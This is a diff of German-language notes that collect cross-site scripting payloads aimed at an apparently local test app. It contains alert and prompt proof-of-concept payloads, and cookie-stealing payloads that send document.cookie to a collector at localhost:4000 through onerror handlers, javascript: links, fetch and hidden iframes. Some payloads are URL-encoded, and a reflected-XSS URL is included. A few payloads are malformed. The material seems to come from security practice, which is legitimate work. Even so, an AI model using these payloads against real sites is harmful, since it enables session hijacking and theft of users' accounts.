@@ -1,28 +1,34 @@
-<audio src=1 href=1 onerror="javascript:alert(1)"></audio>
-<video src=1 href=1 onerror="javascript:alert(1)"></video>
-<img/src/onerror=prompt(8)>
-<img src="invalid-image.jpg" onerror="alert('XSS möglich')">
-
-Hier wird der Cookie mit gesendet:
-User muss erstmal Klicken:
-<a href="javascript:window.location='http://localhost:4000/xss?cookie=' + encodeURIComponent(document.cookie);">Click me</a>
-User schickt direkt den Cookie:
-<img src= "keinbild"onerror="javascript:window.location='http://localhost:4000/xss?cookie=' + encodeURIComponent(document.cookie);"></img>
-
+PROFILE:
 BIO:
 <img src="invalid_image.png" onerror="this.src='http://localhost:4000/xss_bild?cookie=' + encodeURIComponent(document.cookie);">
-
-%3Cimg+src%3D+%22keinbild%22onerror%3D%22javascript%3Awindow.location%3D%27http%3A%2F%2Flocalhost%3A4000%2Fxss%3Fcookie%3D%27+%2B+encodeURIComponent%28document.cookie%29%3B%22%3E%3C%2Fimg%3E
-
-Bio:
 <p>Keine Bio</p><iframe><img src= "keinbild"onerror="javascript:window.location='http://localhost:4000/xss_bild?cookie=' + encodeURIComponent(document.cookie);"></img></iframe>
-
 <span><p>Keine Bio</p></span><br></br><iframe width="1" height="1"><img src= "keinbild"onerror="javascript:window.location='http://localhost:4000/xss?cookie=' + encodeURIComponent(document.cookie);"></img></iframe>
 http://localhost:3000/Echoinput.html?input=%3Cimg+src%3D+%22keinbild%22onerror%3D%22javascript%3Awindow.location%3D%27http%3A%2F%2Flocalhost%3A4000%2Fxss%3Fcookie%3D%27+%2B+encodeURIComponent%28document.cookie%29%3B%22%3E%3C%2Fimg%3E
 
+
+
+Echoinput
+<img src= "keinbild"onerror="javascript:window.location='http://localhost:4000/xss?cookie=' encodeURIComponent(document.cookie);"></img>
+URL:ENCODED ---- 
+%3Cimg+src%3D+%22keinbild%22onerror%3D%22javascript%3Awindow.location%3D%27http%3A%2F%2Flocalhost%3A4000%2Fxss%3Fcookie%3D%27+%2B+encodeURIComponent%28document.cookie%29%3B%22%3E%3C%2Fimg%3E
 
 
 Reflected:
 
 <audio src=1 href=1 onerror="javascript:http://localhost:4000/xss_bild?cookie=' + encodeURIComponent(document.cookie);"></audio>
 <audio src="invalid-file.mp3" onerror="fetch('http://localhost:4000/xss_bild?cookie=' + encodeURIComponent(document.cookie))"></audio>
+
+POC:
+
+<audio src=1 href=1 onerror="javascript:alert(1)"></audio>
+<video src=1 href=1 onerror="javascript:alert(1)"></video>
+<img/src/onerror=prompt(8)>
+<img src="invalid-image.jpg" onerror="alert('XSS möglich')">
+
+Weitere Payloads:
+
+Hier wird der Cookie mit gesendet:
+User muss erstmal Klicken:
+<a href="javascript:window.location='http://localhost:4000/xss?cookie=' + encodeURIComponent(document.cookie);">Click me</a>
+User schickt direkt den Cookie:
+<img src= "keinbild"onerror="javascript:window.location='http://localhost:4000/xss?cookie=' + encodeURIComponent(document.cookie);"></img>
